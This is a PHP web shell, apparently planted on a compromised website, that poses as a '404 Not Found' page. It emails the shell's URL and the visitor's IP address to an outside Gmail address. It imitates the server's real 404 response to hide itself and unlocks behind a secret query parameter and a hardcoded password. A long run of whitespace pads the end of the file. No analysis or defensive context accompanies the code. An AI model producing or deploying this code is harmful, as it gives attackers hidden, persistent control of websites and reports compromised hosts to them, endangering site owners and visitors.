<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'xplutoit@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>
<?php
error_reporting(0);
ini_set('max_execution_time', 0);
session_start();
$name = "diablo";
function login()
{
$random_url = mt_rand(1000000, 247345736453);
$curl = curl_init();
$protocol = 'http://';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') {
        $protocol = 'https://';
    }
    curl_setopt($curl, CURLOPT_URL, $protocol . $_SERVER['HTTP_HOST'] . '/' . $random_url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $server_404 = curl_exec($curl);
    $server_404 = str_replace("/{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    $server_404 = str_replace("{$random_url}", $_SERVER['SCRIPT_NAME'], $server_404);
    echo $server_404;
    exit;
}
if (!isset($_SESSION[md5($sexy)])) {
    if (isset($_GET[$name]) && $_GET[$name] == $name) {
        $_SESSION[md5($sexy)] = true;
    } else {
        login();
    }
}

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "xmenhaxor";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?xXx 日本のハッカー xXx'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?日本のハッカー'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>404 Not Found</title>
<link rel="icon" https://1.top4top.net/p_14405v3810.jpg"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Iceland" rel="stylesheet">



<html><head><title>404 Not Found</title></head>
<style> 
input { margin:0;background-color:#fff;border:1px solid #fff; } 
</style> 
<body>
<h1>Not Found</h1>
<p>The requested URL  was not found on this server.</p><hr>
<form method=post>
<input type="password" name="password"></form></body></html>
      
      <br>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
?>

